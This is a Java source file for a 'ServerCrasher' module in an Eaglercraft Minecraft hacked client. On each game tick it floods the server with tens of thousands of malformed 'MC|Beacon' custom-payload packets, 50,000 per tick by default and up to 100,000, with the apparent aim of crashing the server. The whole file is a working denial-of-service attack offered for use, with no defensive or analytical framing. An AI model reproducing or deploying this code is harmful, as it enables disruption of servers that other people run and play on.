package MEDMEX.Modules.World;

import java.util.Random;
import java.util.stream.IntStream;

import MEDMEX.Client;
import MEDMEX.Event.Event;
import MEDMEX.Event.listeners.EventUpdate;
import MEDMEX.Modules.Module;
import de.Hero.settings.Setting;
import net.lax1dude.eaglercraft.EaglerAdapter;
import net.lax1dude.eaglercraft.EaglerProfile;
import net.minecraft.src.ItemStack;
import net.minecraft.src.Packet102WindowClick;
import net.minecraft.src.Packet15Place;
import net.minecraft.src.Packet250CustomPayload;

public class ServerCrasher extends Module{
	public static ServerCrasher instance;
	public ServerCrasher() {
		super("ServerCrasher", EaglerAdapter.KEY_NONE, Category.WORLD);
	}
	
	public void setup() {
		Client.settingsmanager.rSetting(new Setting("Packets/t", this, 50000, 0, 100000, true));
	}
		
	
	public void onEvent(Event e) 
	{
		if(e instanceof EventUpdate) 
		{
			if(e.isPre()) 
			{
				for (int i = 0; i < Client.settingsmanager.getSettingByName("Packets/t").getValDouble(); i++)
				{
					byte[] b = new byte[1];
					for (int j = 0; j < 1; j++)
					{
						b[j] = (byte)9;
					}
					Client.sendPacket(new Packet250CustomPayload("MC|Beacon",b));
					
				}
			}	
		}	
	}
}
